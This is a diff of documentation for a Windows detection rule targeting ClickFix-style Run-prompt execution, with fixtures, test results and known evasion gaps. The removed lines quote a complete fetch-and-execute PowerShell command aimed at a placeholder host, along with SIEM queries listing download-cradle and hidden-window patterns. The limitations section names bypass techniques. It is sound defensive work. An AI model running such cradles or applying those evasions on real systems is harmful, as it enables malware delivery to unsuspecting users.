@@ -1,111 +1,132 @@
-# Suspicious Process Spawning From Explorer Run Prompt (ClickFix Pattern)
+# Explorer Run-prompt execution (ClickFix pattern)
+
+## Sample handling note
+
+Every command-line example in this document is **defanged**. Interpreter names are split
+(`power` + `shell`), URLs use `hxxp://` with bracketed dots, and no example is a complete,
+pasteable command. An earlier revision of this file contained intact cradle strings and was
+repeatedly quarantined by endpoint antivirus, which is itself a useful data point: the
+signature surface of the documentation matched the signature surface of the attack.
+Defanged examples are the standing convention for this repository.
 
 ## Goal
 
-Identify suspicious process execution spawned directly by `explorer.exe` (indicative of Windows Run prompt invocation, shortcut manipulation, or user-assisted execution) where an interpreter or downloader utility is executed with download cradles, hidden window flags, or remote script parameters.
+Identify an interpreter or downloader utility launched **directly by `explorer.exe`** with
+arguments that indicate remote content retrieval, hidden-window execution, or encoded
+command execution. This is narrower than alerting on interpreter execution generally, and
+narrower than alerting on any `explorer.exe` child.
 
-This bridges initial email/web delivery vectors (such as [`Suspicious_Active_Content_SVG_Attachment`](../../rules/yara/suspicious_active_content_svg.yar)) to endpoint host execution.
+The behavior models ClickFix and ClearFake social engineering, where a web page instructs
+the user to press Win+R, paste clipboard contents, and press Enter. The pasted content runs
+as a child of the shell rather than as a child of a browser or an office application.
 
 ## Detection hypothesis
 
-Legitimate users frequently open `powershell.exe` or `cmd.exe` from the Windows Run prompt (`Win + R`), but rarely include inline web download cradles (`irm`, `iwr`, `Invoke-WebRequest`, `Net.WebClient.DownloadString`), hidden execution flags (`-w hidden`, `-WindowStyle Hidden`), or base64-encoded command strings in the initial Run command.
+An event is suspicious when all three hold:
 
-Conversely, modern initial-access campaigns—notably **ClickFix**, **ClearFake**, **Marko**, and **FakeUpdate** (delivering Lumma Stealer, DarkGate, Amadey, or AsyncRAT)—rely on social engineering lures (e.g. fake Cloudflare CAPTCHAs, Teams/Chrome update errors) instructing the victim to:
-1. Press `Win + R`
-2. Press `Ctrl + V` (pasting an attacker-controlled command from the clipboard)
-3. Press `Enter`
+1. the parent image is `explorer.exe`;
+2. the child image is a scripting interpreter, a signed proxy binary, or a downloader
+   (`power`+`shell`, `pwsh`, `cmd`, `ms`+`hta`, `curl`, `certutil`, `rundll32`, `wscript`,
+   `cscript`); **and**
+3. the command line carries a retrieval or evasion behavior appropriate to that binary.
 
-Because the victim executes the command through the Windows shell, the process tree originates directly from `explorer.exe`.
+Requirement three is per-binary rather than global. A remote URL is meaningful for `ms`+`hta`
+and `curl`; it is not the discriminator for `cmd`, where the discriminator is a chained
+interpreter invocation combined with a hidden-window or encoded-command switch.
 
-An event is flagged as high-fidelity suspicious when:
-1. **Parent process:** `ParentImage` ends with `\explorer.exe`; AND
-2. **Child process & argument combination:**
-   - `powershell.exe` / `pwsh.exe` with download cmdlets (`irm`, `iwr`, `Invoke-RestMethod`, `Invoke-WebRequest`, `Net.WebClient`), hidden window flags (`-w hidden`), encoded command flags (`-enc`), or piped execution (`| iex`, `| Invoke-Expression`); OR
-   - `mshta.exe` loading remote resources (`http://`, `https://`) or inline protocols (`javascript:`, `vbscript:`); OR
-   - `curl.exe` or `certutil.exe` making outbound HTTP(S) requests; OR
-   - `cmd.exe` staging background execution (`start /b`) to launch PowerShell, MSHTA, or Curl downloaders.
+The rule fires on the combination only. An interactive shell opened from the Run box does
+not match. A local script path does not match. A help invocation does not match.
 
 ## Public basis
 
-- Sekoia, "ClickFix: an ingenious social engineering technique" (June 2024): https://www.sekoia.io/en/clickfix-social-engineering-technique/
-- Unit 42, "Threat Brief: ClickFix Social Engineering" (August 2024): https://unit42.paloaltonetworks.com/threat-brief-clickfix-social-engineering/
-- Microsoft Threat Intelligence, "Adversaries continue to innovate initial access via user-assisted execution" (2024)
-- Hoxhunt, "SVG Phishing Email Attachments" (October 2025): https://hoxhunt.com/blog/svg-phishing-email-attachments-mini-report
+- Sekoia, "ClickFix social engineering technique": https://www.sekoia.io/en/clickfix-social-engineering-technique/
+- Palo Alto Unit 42, "Threat Brief: ClickFix social engineering": https://unit42.paloaltonetworks.com/threat-brief-clickfix-social-engineering/
+- Hoxhunt, "SVG phishing email attachments": https://hoxhunt.com/blog/svg-phishing-email-attachments-mini-report
 
 ## ATT&CK mapping
 
-- **T1204.002** — User Execution: Malicious File / Command
-- **T1059.001** — Command and Scripting Interpreter: PowerShell
-- **T1059.003** — Command and Scripting Interpreter: Windows Command Shell
-- **T1218.005** — System Binary Proxy Execution: Mshta
-- **T1027** — Defense Evasion: Obfuscated/Encoded Files or Information
-- **T1105** — Command and Control: Ingress Tool Transfer
+| Technique | Name | Role in this rule |
+|---|---|---|
+| T1204.002 | User Execution: Malicious File | The user is the execution primitive. |
+| T1059.001 | Command and Scripting Interpreter: PowerShell | Primary interpreter branch. |
+| T1059.003 | Windows Command Shell | `cmd` staging branch. |
+| T1059.005 | Visual Basic | `wscript` / `cscript` branch. |
+| T1218.005 | System Binary Proxy Execution: Mshta | Signed proxy branch. |
+| T1218.011 | System Binary Proxy Execution: Rundll32 | Signed proxy branch. |
+| T1027 | Obfuscated Files or Information | Encoded-command and hidden-window switches. |
+| T1105 | Ingress Tool Transfer | Download cradles and `curl` / `certutil` retrieval. |
 
-## Telemetry requirements
+The mapping describes the execution context the rule observes. The rule sees one process
+creation event. It does not prove user deception, successful download, payload execution,
+or actor attribution.
 
-This detection relies on Windows Process Creation telemetry:
-- **Sysmon:** Event ID 1 (`ProcessCreate`) with CommandLine logging enabled.
-- **Windows Security Event Log:** Event ID 4688 (`A new process has been created`) with "Include command line in process creation events" enabled (Audit Process Creation policy).
+## Telemetry prerequisites
+
+Declared inline in the rule under `telemetry_prerequisites`, and expanded in
+`docs/telemetry/PREREQUISITES.md`. In summary:
+
+- Sysmon Event ID 1, or Security Event ID 4688 with command-line capture enabled.
+- Command-line capture requires the "Include command line in process creation events"
+  policy. Without it, `CommandLine` is empty and every action clause fails, taking recall
+  to zero while the rule continues to validate and deploy cleanly. This is the most
+  important silent failure mode for this rule.
+- Sysmon configurations that exclude `explorer.exe` parentage or interpreter binaries
+  remove the rule's entire input.
 
 ## Fixtures
 
-All fixtures are inert, synthetic JSON records located in `tests/fixtures/sigma/`. Remote URLs use RFC 2606 reserved `.invalid` names.
+All fixtures are inert synthetic process-creation events. Remote hosts use RFC 2606
+reserved names.
 
-- **Positive fixtures (6):**
-  - `clickfix_powershell_irm_iex.json`: Standard ClickFix lure payload (`powershell.exe -w hidden -c "irm https://payload-delivery.invalid/cdn/patch.ps1 | iex"`).
-  - `clickfix_powershell_webclient_hidden.json`: `Net.WebClient` download string with hidden window.
-  - `clickfix_powershell_encoded.json`: Base64 encoded PowerShell download command.
-  - `clickfix_mshta_remote.json`: `mshta.exe http://update-service.invalid/auth/session.hta`.
-  - `clickfix_curl_temp_exec.json`: `curl.exe` downloading a binary directly into `%TEMP%`.
-  - `clickfix_cmd_powershell_staging.json`: `cmd.exe /c start /b powershell.exe -w hidden ...`.
+Six positive fixtures cover the branches independently: `cmd` staging into an interpreter,
+`curl` retrieval to a temporary path, `ms`+`hta` remote invocation, encoded-command
+execution, rest-method retrieval piped to expression evaluation, and web-client retrieval
+under a hidden window.
 
-- **Negative fixtures (6):**
-  - `benign_explorer_powershell_interactive.json`: Standard interactive PowerShell launched via Run prompt.
-  - `benign_explorer_cmd_interactive.json`: Standard interactive CMD launched via Run prompt.
-  - `benign_explorer_notepad.json`: Plain desktop application launch (`notepad.exe`).
-  - `benign_powershell_local_script.json`: Local script execution without remote downloads or hidden flags.
-  - `benign_terminal_powershell_irm.json`: PowerShell download cradle spawned by Windows Terminal (developer CLI, not Explorer).
-  - `benign_explorer_curl_help.json`: `curl.exe --help` executed from Run prompt.
+Negative fixtures cover the near-miss cases that separate this rule from a naive
+parent-child rule: an interactive shell from the Run box, an interactive `cmd`, a `curl`
+help invocation, a local script path, `notepad`, and a retrieval issued from a terminal
+application rather than from `explorer.exe`.
 
-## Measured results (2026-09-03)
+## Measured results
 
-Validated via automated regression suite (`tests/test_sigma_rules.py`):
-- **Synthetic positives:** 6/6 matched (100% recall).
-- **Synthetic negatives:** 0/6 matched (0% false positives).
-- **Backend conversions:** 3/3 verified (Splunk SPL, Elasticsearch Lucene, CrowdStrike Falcon LogScale).
+Regression tests compile the rule against an in-memory SQLite event store and assert
+exact fixture outcomes (`tests/test_sigma_rules.py`).
 
-## SIEM / EDR query examples
+| Measurement | Result |
+|---|---|
+| Synthetic positives matched | 6 of 6 |
+| Synthetic negatives fired | 0 of 6 |
+| Benign enterprise noise-floor profiles fired | 0 |
+| SIEM dialects compiled | Splunk SPL, Elasticsearch Lucene, CrowdStrike LogScale |
 
-### Splunk (SPL)
-
-```spl
-ParentImage="*\\explorer.exe" (Image IN ("*\\powershell.exe", "*\\pwsh.exe") CommandLine IN ("*Invoke-WebRequest*", "*iwr *", "*iwr(*", "*Invoke-RestMethod*", "*irm *", "*irm(*", "*Net.WebClient*", "*DownloadString*", "*DownloadFile*", "*-w hidden*", "*-windowstyle hidden*", "*-encodedcommand*", "*-enc *", "*| iex*", "*|iex*", "*| Invoke-Expression*")) OR (Image="*\\mshta.exe" CommandLine IN ("*http://*", "*https://*", "*javascript:*", "*vbscript:*")) OR (Image IN ("*\\curl.exe", "*\\certutil.exe") CommandLine IN ("*http://*", "*https://*")) OR (Image="*\\cmd.exe" CommandLine IN ("*powershell*", "*pwsh*", "*mshta*", "*curl*") CommandLine IN ("*start /b*", "*/c start*", "*-w hidden*", "*-windowstyle hidden*", "*-enc*", "*Invoke-*", "*irm *", "*iwr *", "*DownloadString*")) | table CommandLine,Image,ParentImage,User
-```
-
-### Elasticsearch (Lucene)
-
-```lucene
-ParentImage:*\\explorer.exe AND (((Image:(*\\powershell.exe OR *\\pwsh.exe)) AND (CommandLine:(*Invoke\-WebRequest* OR *iwr\ * OR *iwr\(* OR *Invoke\-RestMethod* OR *irm\ * OR *irm\(* OR *Net.WebClient* OR *DownloadString* OR *DownloadFile* OR *\-w\ hidden* OR *\-windowstyle\ hidden* OR *\-encodedcommand* OR *\-enc\ * OR *\|\ iex* OR *\|iex* OR *\|\ Invoke\-Expression*))) OR (Image:*\\mshta.exe AND (CommandLine:(*http\:\/\/* OR *https\:\/\/* OR *javascript\:* OR *vbscript\:*))) OR ((Image:(*\\curl.exe OR *\\certutil.exe)) AND (CommandLine:(*http\:\/\/* OR *https\:\/\/*))) OR (Image:*\\cmd.exe AND (CommandLine:(*powershell* OR *pwsh* OR *mshta* OR *curl*)) AND (CommandLine:(*start\\ \\/b* OR *\\/c\\ start* OR *\\-w\\ hidden* OR *\\-windowstyle\\ hidden* OR *\\-enc* OR *Invoke\\-* OR *irm\\ * OR *iwr\\ * OR *DownloadString*))))
-```
-
-### CrowdStrike Falcon (LogScale)
-
-```logscale
-ParentImage=/\\explorer\.exe$/i (Image=/\\powershell\.exe$/i or Image=/\\pwsh\.exe$/i CommandLine=/Invoke-WebRequest/i or CommandLine=/iwr /i or CommandLine=/iwr\(/i or CommandLine=/Invoke-RestMethod/i or CommandLine=/irm /i or CommandLine=/irm\(/i or CommandLine=/Net\.WebClient/i or CommandLine=/DownloadString/i or CommandLine=/DownloadFile/i or CommandLine=/-w hidden/i or CommandLine=/-windowstyle hidden/i or CommandLine=/-encodedcommand/i or CommandLine=/-enc /i or CommandLine=/\| iex/i or CommandLine=/\|iex/i or CommandLine=/\| Invoke-Expression/i) or (Image=/\\mshta\.exe$/i CommandLine=/http:\/\//i or CommandLine=/https:\/\//i or CommandLine=/javascript:/i or CommandLine=/vbscript:/i) or (Image=/\\curl\.exe$/i or Image=/\\certutil\.exe$/i CommandLine=/http:\/\//i or CommandLine=/https:\/\//i) or (Image=/\\cmd\.exe$/i CommandLine=/powershell/i or CommandLine=/pwsh/i or CommandLine=/mshta/i or CommandLine=/curl/i CommandLine=/start \/b/i or CommandLine=/\/c start/i or CommandLine=/-w hidden/i or CommandLine=/-windowstyle hidden/i or CommandLine=/-enc/i or CommandLine=/Invoke-/i or CommandLine=/irm /i or CommandLine=/iwr /i or CommandLine=/DownloadString/i)
-```
+These are fixture measurements, not accuracy claims. The positives are events this
+repository authored. They demonstrate that the logic behaves as specified and that
+refactoring does not silently break a branch. They say nothing about recall against real
+campaign traffic, and no representative real-world corpus of ClickFix process events is
+redistributable here.
 
 ## Known limitations
 
-1. **Alternate LOLBins:** Adversaries may use less common binaries (`rundll32.exe`, `regsvr32.exe`, `cscript.exe`) or Windows Subsystem for Linux (`wsl.exe`, `bash.exe`) to execute payloads from the Run dialog.
-2. **Obfuscated / Fragmented Commands:** String splitting, caret insertion (`c^m^d`), environment variable expansion, or PowerShell format operator tokens (`{0}{1}` -f ...) can evade string-matching detection in process creation logs without script block logging.
-3. **Execution via Alternative Parents:** If the victim is instructed to paste into a pre-existing terminal window or third-party launcher (e.g. PowerToys Run, Alfred, Keypirinha), `ParentImage` will not be `explorer.exe`.
-4. **Complementary Telemetry:** This rule should be layered with:
-   - PowerShell Script Block Logging (Event ID 4104) to capture deobfuscated payload contents.
-   - Registry monitoring on `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` (Sigma: `registry_set_potential_clickfix_execution.yml`).
-   - Network connection telemetry (Sysmon EID 3) correlating endpoint outbound web requests directly following shell execution.
+Discovered by the adversarial swarm and retained deliberately as documented gaps:
 
-## Reproducing the tests
+- **Argument-form coverage is enumerated, not parsed.** The rule matches switch spellings
+  as literal substrings. It was expanded once already to cover truncated forms of the
+  window-style switch after the swarm found them. Any spelling not enumerated evades. A
+  command-line tokenizer that normalizes abbreviations before matching would be durable;
+  substring enumeration is a treadmill.
+- **Parent lineage is a single hop.** An intermediate process between `explorer.exe` and
+  the interpreter breaks the parent clause entirely.
+- **Retrieval aliases outside the enumerated set evade.** Alternate download primitives,
+  COM-based retrieval, and native .NET method calls are not covered.
+- **Encoding and concatenation defeat the action clauses.** Environment-variable
+  reassembly and character-code construction were both used by the swarm to bypass the
+  literal matches.
+- **`falsepositives` is under-specified.** Administrative use of the Run box for remote
+  scripting will alert. Environments with heavy administrative shell use from the desktop
+  need a tuning pass before this deploys at `high`.
 
-```powershell
-python -m unittest tests/test_sigma_rules.py -v
-```
+## Reproducing
+
+    python -m unittest tests.test_sigma_rules -v
+    python -m tools.swarm.cli --target sigma --max-cycles 3
